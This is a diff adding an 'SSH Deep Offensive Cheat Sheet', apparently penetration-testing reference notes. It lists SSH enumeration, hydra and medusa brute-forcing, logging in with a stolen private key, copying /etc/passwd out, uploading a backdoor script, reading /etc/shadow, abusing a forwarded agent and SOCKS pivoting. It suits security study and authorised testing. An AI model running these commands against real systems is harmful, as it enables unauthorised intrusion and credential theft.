@@ -1,0 +1,110 @@
+=========================================
+SSH (Secure Shell) – Deep Offensive Cheat Sheet
+=========================================
+
+PORT:
+22/tcp (default)
+Custom ports common (2222, 2200, 22222)
+
+RFC:
+RFC 4251–4256
+
+Transport:
+TCP
+
+-----------------------------------------
+1. BASIC ENUMERATION
+-----------------------------------------
+
+# Fast scan
+nmap -p22 <IP>
+
+# Full service detection
+nmap -p22 -sC -sV -A <IP>
+nmap -p22 --script ssh-* <IP>
+nmap -p22 --script ssh2-enum-algos <IP>
+nc <IP> 22
+telnet <IP> 22
+ssh -vvv user@<IP>
+
+# Timing attack (OpenSSH < 7.7)
+ssh -o PreferredAuthentications=none user@<IP>
+
+ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAlgorithms=+ssh-rsa user@<IP>
+python ssh_enum.py <IP> users.txt
+
+use auxiliary/scanner/ssh/ssh_enumusers
+ssh -vvv user@<IP>
+
+hydra -l user -P passwords.txt ssh://<IP>
+hydra -L users.txt -P passwords.txt ssh://<IP>
+medusa -h <IP> -u user -P passwords.txt -M ssh
+
+# Check readable keys
+ls -la ~/.ssh/
+
+Files:
+id_rsa        → private key
+id_rsa.pub    → public key
+authorized_keys
+
+# Use stolen key
+chmod 600 id_rsa
+ssh -i id_rsa user@<IP>
+ssh-keygen -y -f id_rsa
+ssh-keygen -t rsa -f id_rsa
+nmap --script ssh2-enum-algos -p22 <IP>
+
+# Tool
+ssh-audit <IP>
+
+scp user@<IP>:/etc/passwd .
+scp backdoor.sh user@<IP>:/tmp/
+sftp user@<IP>
+
+# Local port forwarding
+ssh -L 8080:127.0.0.1:80 user@<IP>
+
+# Remote port forwarding
+ssh -R 4444:127.0.0.1:4444 user@<IP>
+
+# Dynamic SOCKS proxy
+ssh -D 9050 user@<IP>
+
+# Check agent
+echo $SSH_AUTH_SOCK
+
+# List loaded keys
+ssh-add -l
+
+# Abuse forwarded agent
+ssh -A user@<IP>
+
+whoami
+id
+groups
+uname -a
+sudo -l
+cat /etc/passwd
+cat /etc/shadow (if readable)
+
+/etc/ssh/sshd_config
+~/.ssh/authorized_keys
+~/.ssh/config
+
+/var/log/auth.log
+/var/log/secure
+/var/log/messages
+
+nmap
+hydra
+medusa
+metasploit
+ssh-audit
+searchsploit
+scp
+sftp
+proxychains
+netcat
+
+
